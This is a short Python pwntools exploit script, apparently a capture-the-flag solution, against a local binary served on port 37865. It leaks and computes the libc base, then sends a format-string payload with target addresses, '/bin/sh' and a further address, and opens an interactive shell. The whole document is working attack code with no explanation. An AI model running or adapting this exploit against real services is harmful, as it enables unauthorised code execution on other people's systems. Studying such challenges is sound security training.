from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]

#p = process("./vuln")
p=remote('localhost',37865)
p.recvuntil("0x")
libcbase = int(p.recv(12), 16) - 0x61CC0
log.info("libcaddr= %#x" % (libcbase))
log.info("t1= %#x" % (libcbase + 0x222968))
log.info("t2= %#x" % (libcbase + 0x222F68))
#gdb.attach(p, "b system")
payload = b"%7$s%8$s" + p64(libcbase + 0x222968) + p64(libcbase + 0x222F68)
sleep(0.1)
p.sendline(payload)
sleep(0.1)
pause()
p.sendline('/bin/sh\x00')
sleep(0.1)
p.sendline(p64(libcbase + 0x522C0))

p.interactive()
